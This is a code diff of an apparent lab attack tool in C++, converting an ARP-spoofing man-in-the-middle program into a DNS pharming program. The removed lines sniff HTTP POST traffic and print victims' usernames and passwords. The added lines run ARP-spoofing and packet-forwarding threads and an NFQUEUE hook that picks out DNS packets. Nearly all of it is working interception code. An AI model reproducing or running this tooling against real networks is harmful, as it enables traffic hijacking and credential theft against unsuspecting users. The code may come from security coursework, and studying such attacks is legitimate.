@@ -1,4 +1,4 @@
-#include "mitm_attack.hpp"
+#include "pharm_attack.hpp"
 
 // #define INFO 1
 
@@ -73,7 +73,7 @@ bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<u
     return modified;
 }
 
-void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
+void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
     // Get the payload
     uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
     int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
@@ -83,35 +83,10 @@ void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo 
     while (total_sent < bytes) {
         int to_send = std::min(chunk_size, bytes - total_sent);
         if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-            perror("sendto() failed (NonHttpPostPacket)");
+            perror("sendto() failed (Packet)");
             exit(EXIT_FAILURE);
         }
         total_sent += to_send;
-    }
-}
-
-void printUsernameAndPassword(uint8_t *payload, int payload_length) {
-    // Find the username and password
-    char *username_start = strstr((char *)payload, "Username=");
-    char *password_start = strstr((char *)payload, "Password=");
-    if (username_start && password_start) {
-        char *username_end = strchr(username_start, '&');
-        char *password_end = (char *)payload + payload_length;
-
-        if (!username_end) {
-            username_end = password_start - 1;
-        }
-
-        // Print the username and password
-        printf("\nUsername: ");
-        for (char *p = username_start + strlen("Username="); p < username_end; p++) {
-            printf("%c", *p);
-        }
-        printf("\nPassword: ");
-        for (char *p = password_start + strlen("Password="); p < password_end; p++) {
-            printf("%c", *p);
-        }
-        printf("\n");
     }
 }
 
@@ -120,6 +95,12 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
     int saddr_len = sizeof(saddr);
+
+    int val = 1;
+    if (setsockopt(sd, SOL_SOCKET, SO_MARK, &val, sizeof(val)) < 0) {
+        perror("setsockopt() failed");
+        exit(EXIT_FAILURE);
+    }
 
     while (true) {
         // Receive packet
@@ -139,42 +120,14 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
             continue;  // Not enough data for IP header
         }
         struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
-        // If the ip is loopback, continue
         if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
             continue;
         }
 
         modifyPacket(buffer, ip_mac_pairs, local_info);
 
-        // Check if packet is a TCP packet
-        if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
-            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-                perror("sendto() failed (CHECK TCP PACKET)");
-                exit(EXIT_FAILURE);
-            }
-            continue;  // Not enough data for TCP header
-        }
+        sendMarkedPacket(buffer, bytes, sd, local_info);
 
-        // Get the payload
-        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
-        int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
-
-        // Check if the payload is an HTTP POST packet
-        const char *http_post = "POST";
-
-        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
-            sendNonHttpPostPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-
-        // Print the username and password
-        printUsernameAndPassword(payload, payload_length);
-
-        // Send the modified packet
-        if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-            perror("sendto() failed");
-            exit(EXIT_FAILURE);
-        }
         memset(buffer, 0, IP_MAXPACKET);
     }
 }
@@ -276,6 +229,73 @@ void sendARPRequest(int sd, struct LocalInfo local_info) {
     }
 }
 
+static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+                           struct nfq_data *nfa, void *data) {
+    struct nfqnl_msg_packet_hdr *ph;
+    struct nfqnl_msg_packet_hw *hwph;
+    u_int32_t id = 0;
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph) {
+        id = ntohl(ph->packet_id);
+    }
+    unsigned char *packet;
+    int len = nfq_get_payload(nfa, &packet);
+    if (len >= 0) {
+        printf("Received packet with length %d\n", len);
+        // Parse the packet
+        struct iphdr *iph = (struct iphdr *)packet;
+        if (iph->protocol == IPPROTO_UDP) {
+            struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
+
+            // Check if the destination port is 53 (DNS Packet)
+            if (ntohs(udph->dest) == 53) {
+                printf("DNS Packet\n");
+            }
+        }
+    } else {
+        printf("Error: nfq_get_payload returned %d\n", len);
+    }
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+void NFQHandler() {
+    struct nfq_handle *h;
+    struct nfq_q_handle *qh;
+    struct nfnl_handle *nh;
+    int fd;
+    int rv;
+    char buf[4096] __attribute__((aligned));
+
+    h = nfq_open();
+    if (!h) {
+        fprintf(stderr, "error during nfq_open()\n");
+        exit(1);
+    }
+    if (nfq_unbind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_unbind_pf()\n");
+        exit(1);
+    }
+    if (nfq_bind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_bind_pf()\n");
+        exit(1);
+    }
+    qh = nfq_create_queue(h, 0, &handleNFQPacket, NULL);
+    if (!qh) {
+        fprintf(stderr, "error during nfq_create_queue()\n");
+        exit(1);
+    }
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
+        fprintf(stderr, "can't set packet_copy mode\n");
+        exit(1);
+    }
+    fd = nfq_fd(h);
+    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
+        nfq_handle_packet(h, buf, rv);
+    }
+    nfq_destroy_queue(qh);
+    nfq_close(h);
+}
+
 int main(int argc, char **argv) {
     char *interface;
     struct ifreq ifr;
@@ -328,19 +348,22 @@ int main(int argc, char **argv) {
     // Use a table to save IP-MAC pairs
     std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;
 
-    // Start the thread
-    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
-
     printf("Available devices\n");
     printf("-----------------------------------------\n");
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    // Receive responses
-    receiveHandler(sd, ip_mac_pairs, local_info);
+    // Start the threads
+    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
+    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
 
-    // Wait for the thread to finish
+    // Start the NFQHandler
+    std::thread nfq_thread(NFQHandler);
+
+    // Wait for threads to finish
     send_thread.join();
+    receive_thread.join();
+    nfq_thread.join();
 
     // Close socket descriptor.
     close(sd);
